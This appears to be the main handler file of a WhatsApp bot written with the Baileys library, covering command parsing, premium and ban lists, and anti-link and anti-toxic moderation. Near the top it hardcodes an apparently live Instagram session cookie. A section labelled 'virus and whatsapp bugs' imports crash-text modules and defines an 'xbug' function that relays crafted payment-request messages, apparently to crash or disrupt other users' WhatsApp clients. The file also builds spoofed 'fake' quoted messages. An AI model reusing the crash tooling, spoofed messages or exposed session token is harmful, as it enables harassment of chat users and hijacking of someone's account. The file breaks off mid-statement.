
require('./settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, Mimetype, generateWAMessage, prepareWAMessageMedia, prepareMessageFromContent,  areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const os = require('os')
const util = require('util')
const path = require('path')
const axios = require('axios')
const chalk = require('chalk')
const crypto = require('crypto')
const yts = require('youtube-yts')
const xfar = require('xfarr-api')
const request = require('request')
const xeontod = require("tod-api")
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const thiccysapi = require('textmaker-thiccy')
const QrCode = require('qrcode-reader')
const qrcode = require('qrcode')
const { buffergif } = require('./lib/myfunc2')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const google = require('google-it')
const { exec, spawn, execSync } = require("child_process")
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { jadibot, listJadibot } = require('./lib/rentbot')
const { performance } = require('perf_hooks')
const { igApi, getSessionId } = require('insta-fetcher');
let ig = new igApi("csrftoken=6wrPrUbsa05Csm9wlqxAOSqRwxxscjD;rur=16771\05427758921939\0541695476019:01f7994241f5e244ccf1bb676853d91b4f281e385e564f6c99a3592b27b0a39dada825e8;mid=Yy21jQALAAEmUl5E0beHHz_eVvyI;ds_user_id=27758921939;sessionid=27758921939%3ASGdS1WkMZToRfs%3A12%3AAYe5Sp23sp78pv0PnIRL6X-ySJdCDpe4uxbuJxtcxw;ig_did=09B76BA7-2D56-42E5-89BB-3584A9EAD69B");
ig.setCookie("csrftoken=6wrPrUbsa05Csm9wlqxAOSqRwxxscjD;rur=16771\05427758921939\0541695476019:01f7994241f5e244ccf1bb676853d91b4f281e385e564f6c99a3592b27b0a39dada825e8;mid=Yy21jQALAAEmUl5E0beHHz_eVvyI;ds_user_id=27758921939;sessionid=27758921939%3ASGdS1WkMZToRfs%3A12%3AAYe5Sp23sp78pv0PnIRL6X-ySJdCDpe4uxbuJxtcxw;ig_did=09B76BA7-2D56-42E5-89BB-3584A9EAD69B");
const maker = require('mumaker')
const textpro = require('./lib/textpro')
const { fetchBuffer } = require("./lib/myfunc2")
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const ini_mark = `0@s.whatsapp.net`
const ownernya = ownernomer + '@s.whatsapp.net'

//TIME
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu = `تصبحون علي خير 🌌`
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = `الليل الان 🌃`
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = `الليل الان 🌃`
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = `غروب الشمس 🌅`
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = `الفجر الان 🌄`
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = `الفجر الان 🌄`
 } 
 
// read database game
let tebaklagu = db.data.game.tebaklagu = []
let kuismath = db.data.game.math = []
let vote = db.data.others.vote = []

//read database jid
let premium = JSON.parse(fs.readFileSync('./database/user/premium.json'));
let banned = JSON.parse(fs.readFileSync('./database/user/banned.json'));
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'));
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'));
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'));
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'));
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'));
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'));
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'));
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));
let bad = JSON.parse(fs.readFileSync('./src/toxic/bad.json'));
let autorep =JSON.parse(fs.readFileSync('./database/autoreply.json'));

//database virus and whatsapp bugs
//warrrrrrrrr
const { xeonvirtex } = require('./XBug/xeonvirtex')
const { xeonbutton } = require('./XBug/xeonbutton')
const { xeonbrutal } = require('./XBug/xeonbrutal')
const { iphone } = require('./XBug/virtex/iphone')
const { iphone5 } = require('./XBug/virtex/iphone5')
const { xeonbutton2 } = require('./XBug/virtex/xeonbutton2')
const { bugsw } = require('./XBug/virtex/bugsw')
const xpicvirus = fs.readFileSync(`./XBug/xpicvirus.png`)
//warrrrrrrrrr

//database auto reply
let xeonysticker = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/sticker.json'));
let xeonyaudio = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/audio.json'));
let xeonyimage = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/image.json'));
let xeonyvideo = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/video.json'));

module.exports = ElgazarBot = async (ElgazarBot, m, chatUpdate, store) => {
    try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°${themeemoji}π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await ElgazarBot.decodeJid(ElgazarBot.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const sender = m.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid
const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
const type = Object.keys(mek.message)[0]  
const from = mek.key.remoteJid      
const content = JSON.stringify(mek.message)

	    const cekUser = (users, id) => {     
var cek = null
Object.keys(user).forEach((i) => { 
if (user[i].id === id){ cek = i } })
if (cek !== null){ 
if (users == "id"){ return user[cek].id }
if (users == "emote"){ return user[cek].emote }
if (users == "timers"){ return user[cek].timers }
if (users == "hit"){ return user[cek].hit }
if (users == "star"){ return user[cek].star }
if (users == "alasan"){ return user[cek].alasan }
if (users == "ban"){ return user[cek].ban }
if (users == "premium"){ return user[cek].premium }
}
if (cek == null) return null
}
	
	         //media detect \\
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
     
        //hijack function
        const ordermessage = (m.msg.xtype === 'conversation' && m.msg.message.conversation) ? m.msg.message.conversation : (m.msg.xtype == 'imageMessage') && m.msg.message.imageMessage.caption ? m.msg.message.imageMessage.caption : (m.msg.xtype == 'videoMessage') && m.msg.message.videoMessage.caption ? m.msg.message.videoMessage.caption : (m.msg.xtype == 'extendedTextMessage') && m.msg.message.extendedTextMessage.text.startsWith(prefix) ? m.msg.message.extendedTextMessage.text : (m.msg.xtype == 'buttonsResponseMessage') && m.msg.message.buttonsResponseMessage.selectedButtonId.startsWith(prefix) ? m.msg.message.buttonsResponseMessage.selectedButtonId : (m.msg.xtype == 'listResponseMessage') && m.msg.message.listResponseMessage.singleSelectReply.selectedRowId.startsWith(prefix) ? m.msg.message.listResponseMessage.singleSelectReply.selectedRowId : (m.msg.xtype == 'templateButtonReplyMessage') && m.msg.message.templateButtonReplyMessage.selectedId.startsWith(prefix) ? m.msg.message.templateButtonReplyMessage.selectedId : ''   
        const order = ordermessage.slice(0).trim().split(/ +/).shift().toLowerCase()	   
	 
	
	    //Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
		
	
// Group
        const groupMetadata = m.isGroup ? await ElgazarBot.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
	    const isBan = banned.includes(m.sender)
        const isPremium = premium.includes(m.sender)
        const Autoreply = m.isGroup ? autorep.includes(from) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
        const solot = [
		'🍊 : 🍒 : 🍐',
		'🍒 : 🔔 : 🍊',
		'🍇 : 🍇 : 🍇',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍐 : 🍐 : 🍐',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🍐 : 🍇',
		'🔔 : 🔔 : 🔔  Win',
		'🍒 : 🍒 : 🍒 Win',
		'🍌 : 🍌 : 🍌 Lose'
		]

//afk and other
try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
            
    let chats = global.db.data.chats[m.chat]
    if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
    if (chats) {
if (!('mute' in chats)) chats.mute = false
if (!('antilink' in chats)) chats.antilink = false
    } else global.db.data.chats[m.chat] = {
mute: false,
antilink: false,
    }
    
    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = false
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
//function leveling & pick
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

// Public & Self
if (!ElgazarBot.public) {
    if (!m.key.fromMe) return
}
function randomNomor(angka){
return Math.floor(Math.random() * angka) + 1
}
const hsjdh = randomNomor(5)

//auto react all message
/////ElgazarBot.sendMessage(m.chat, {
          ////react: {
            ////////////////////////////////////////text: `${pickRandom(['😨','😅','😂','😳','😎', '🥵', '😱', '🐦', '🙄', '🐤','🗿','🐦','🤨','🥴','😐','👆','😔', '👀','👎'])}`,
            ////key: m.key,
          /////}})

//auto recording all
    if (global.autoRecord) { if (m.chat) { ElgazarBot.sendPresenceUpdate('recording', m.chat) }
}
//autotyper all
  if (global.autoTyping) { if (m.chat) { ElgazarBot.sendPresenceUpdate('composing', m.chat) }
}

// total hit
        global.hit = {}
if (isCmd) {
data = await fetchJson('https://api.countapi.xyz/hit/ElgazarBot-md/visits')
jumlahcmd = `${data.value}`
dataa = await fetchJson(`https://api.countapi.xyz/hit/ElgazarBot-md${moment.tz('Asia/Kolkata').format('DDMMYYYY')}/visits`)
jumlahharian = `${dataa.value}`
}

//premium
const prem1 = `Hi bro  ${pushname} ${ucapanWaktu} \n\nThis feature is for premium members only, please buy premium to use this feature`
const prem2 = `Click the button below to buy premium`
const prem3 = [{buttonId: `${prefix}buypreim`,buttonText: {displayText: `BUY PREMIUM`,},type: 1,},]
blomdaftar = `${ucapanWaktu} @${sender.split("@")[0]} Kamu belum terdaftar di database cek private message mu untuk mendaftar`
limitabis = `*[YOUR LIMIT IS EXPIRED]*\nBuy limit in ${prefix}buylimit or buy premium to get unlimited limit`

//WARRRRRRR
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false
}}}
const xbug = (teks) => {
  ElgazarBot.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
//-------------------End--------------------\\
//Dont edit ot recode or bug wont work

const fmedia =  {
  key : {
    fromMe: false,
participant : '0@s.whatsapp.net'
},
     contextInfo: {
    forwardingScore: 9999,
    isForwarded: false, //:'v
showAdAttribution: true,
title: botname,
mediaType: "VIDEO",
mediaUrl: websitex,
previewType: "PHOTO",
thumbnail: thumb,
sourceUrl: "",
detectLinks: false,
    }}
    
    //reply fake
	//group target \\
const reply = (teks) => {
           ElgazarBot.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }

	//button
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const butonna = {
text: text1,
footer: desc1,
buttons: but,
headerType: 1
}
ElgazarBot.sendMessage(id, butonna, options)
}
const http = randomNomor(500)

//document
const kontol = {
	key : {
   participant : '0@s.whatsapp.net'
},
       message: {
    documentMessage: {
    title: `${pushname}`, 
    jpegThumbnail: thumb
  }
}
      }
sendMenuDoc = async (ID, doc, fileName, fileLength, caption, footer, time, buttons, boddy, thumbnail, thumbnailUrl, sourceUrl, mediaUrl, options) => {
let buttonMessage = {
  document: doc,
  mimetype: "application/pdf",
  fileName: fileName,
  fileLength: fileLength,
  caption: caption,
  footer: footer,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
     title: time,
     body: boddy,
     thumbnail: thumbnail,
     thumbnailUrl: thumbnailUrl,
     sourceUrl: sourceUrl,
     mediaUrl: mediaUrl,  
     renderLargerThumbnail: true,
     showAdAttribution: true,
     mediaType: 1
   }}
       }
   ElgazarBot.sendMessage(m.chat, buttonMessage, options)
   }
                
        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await ElgazarBot.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await ElgazarBot.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        // Anti Link
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return m.reply(`${mess.botAdmin}, to kick the person who send link`)
        let gclink = (`https://chat.whatsapp.com/`+await ElgazarBot.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return ElgazarBot.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`})
        if (isAdmins) return ElgazarBot.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`})
        if (isCreator) return ElgazarBot.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`})
        await ElgazarBot.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			ElgazarBot.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending group link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }
        
          // Antiwame by xeon
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
        await ElgazarBot.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ElgazarBot.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
        await ElgazarBot.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ElgazarBot.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirtex by xeon
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return m.reply(mess.botAdmin)
          await ElgazarBot.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			ElgazarBot.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by xeon
if (antiToxic)
if (bad.includes(messagesD)) {
tos = ['مرحبًا ، راقب فمك','لم تتعلم كيف تتكلم?','توقف عن السب يا صديقي🤢','لا تكون غير محترم🦄']
sin =  tos[Math.floor(Math.random() * (tos.length))]
m.reply(sin)
if (m.text) {
bvl = `\`\`\`「 منع السب 」\`\`\`\n\nأنت تستخدم كلمة سيئة ولكنك مشرف لهاذا السبب لن اطردك✨`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await ElgazarBot.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ElgazarBot.sendMessage(from, {text:`\`\`\`「 منع السب 」\`\`\`\n\n@${m.sender.split("@")[0]} تم طرده بسبب السب في الجروب`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
//antilink youtube video by xeon
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await ElgazarBot.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ElgazarBot.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by xeon
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await ElgazarBot.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ElgazarBot.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by xeon
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await ElgazarBot.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ElgazarBot.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await ElgazarBot.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ElgazarBot.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
